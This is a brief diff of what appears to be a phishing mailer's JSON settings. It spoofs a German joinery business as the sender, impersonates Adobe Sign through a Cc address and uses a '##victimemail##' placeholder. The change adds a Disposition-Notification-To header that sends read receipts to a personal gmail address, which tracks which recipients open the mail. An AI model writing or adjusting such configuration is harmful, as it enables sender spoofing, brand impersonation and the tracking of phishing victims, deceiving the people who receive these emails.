@@ -12,7 +12,8 @@
     "From": "info@schreinerei-spuck.de",
     "Reply-To": "",
     "Cc": "adobesign@adobesign.com",
-    "X-Confirm-Reading-To": "'##victimemail##'",
+    "X-Confirm-Reading-To": "info@schreinerei-spuck.de",
+    "Disposition-Notification-To": "lolaissah@gmail.com",
     "Return-Path": "info@schreinerei-spuck.de"
   },
   "enableCustomHeaders": true,
